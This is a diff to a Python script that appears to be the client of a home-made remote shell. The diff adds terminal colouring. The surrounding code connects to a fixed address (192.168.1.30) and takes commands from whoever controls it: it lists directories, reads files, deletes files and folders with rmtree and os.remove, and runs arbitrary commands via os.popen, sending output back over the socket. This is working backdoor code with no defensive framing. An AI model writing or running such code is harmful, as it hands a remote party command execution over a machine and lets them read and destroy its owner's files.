@@ -4,6 +4,9 @@ import re
 import os
 from sys import platform
 from shutil import rmtree
+import colorama
+
+colorama.init(autoreset=True)
 
 s = socket.socket()
 HOST = "192.168.1.30"
@@ -15,7 +18,7 @@ DC_MSG = "!dc"
 s.connect(SERVER)
 
 def getPWD():
-    pwd = f'{os.getcwd()}'
+    pwd = f'{colorama.Back.BLACK}{colorama.Fore.YELLOW}{os.getcwd()}'
     return pwd
 
 cmdList = {}
@@ -44,9 +47,14 @@ while run:
             ls = os.listdir(lsDir)
         else:
             ls = os.listdir()
-
         for item in ls:
-            lsItems += item + "\t"
+            if os.path.isdir(item) and not re.search("^\.", item):
+                item = colorama.Back.YELLOW + colorama.Fore.BLACK + item + colorama.Back.RESET + colorama.Fore.RESET
+
+            if re.search("^\.", item):
+                lsItems += f"{colorama.Back.MAGENTA}{item}{colorama.Back.RESET}\t"
+            else:
+                lsItems += item + "\t"
         lsItems += "\n"
         s.send(lsItems.encode(FORMAT))
     elif re.search("^cd ", cmd):
@@ -60,9 +68,11 @@ while run:
     elif re.search("^rm -rf ", cmd):
         toRemove = cmd.replace("rm -rf ", "")
         rmtree(toRemove)
+        s.send(f"{colorama.Fore.GREEN}Dir: {toRemove} was deleted".encode(FORMAT))
     elif re.search("^rm ", cmd):
         toRemove = cmd.replace("rm ", "")
         os.remove(toRemove)
+        s.send(f"{colorama.Fore.GREEN}File: {toRemove} was deleted".encode(FORMAT))
     elif re.search("cat ", cmd):
         catFile = cmd.replace("cat ", "")
         try:
@@ -74,7 +84,7 @@ while run:
                 ctn += line
             s.send(ctn.encode(FORMAT))
         except:
-            s.send("File doesnt't exist".encode(FORMAT))
+            s.send(f"{colorama.Fore.RED}File doesnt't exist".encode(FORMAT))
     
     ### TODO -- test this function on other computer ###
     elif re.search("^echo ", cmd):
@@ -82,4 +92,4 @@ while run:
         print(cmd)
     else:
         os.popen(cmd)
-        s.send(f"CMD RECV: {cmd}".encode(FORMAT))
+        s.send(f"Get command: {cmd}".encode(FORMAT))
